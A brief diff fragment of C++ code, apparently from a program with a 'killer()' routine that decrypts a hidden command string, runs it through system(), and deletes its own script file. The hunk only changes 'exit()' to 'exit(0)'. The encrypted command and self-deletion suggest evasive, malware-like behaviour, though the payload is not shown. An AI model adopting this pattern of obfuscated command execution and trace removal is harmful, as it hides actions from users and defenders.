@@ -38,7 +38,7 @@ void killer(){
   const char * system2_ = decrypt(system2, sizeof(system2)).c_str();
   system(system2_);
   remove(script_path);
-  exit();
+  exit(0);
 }
 void  ALARMhandler(int sig)
 {
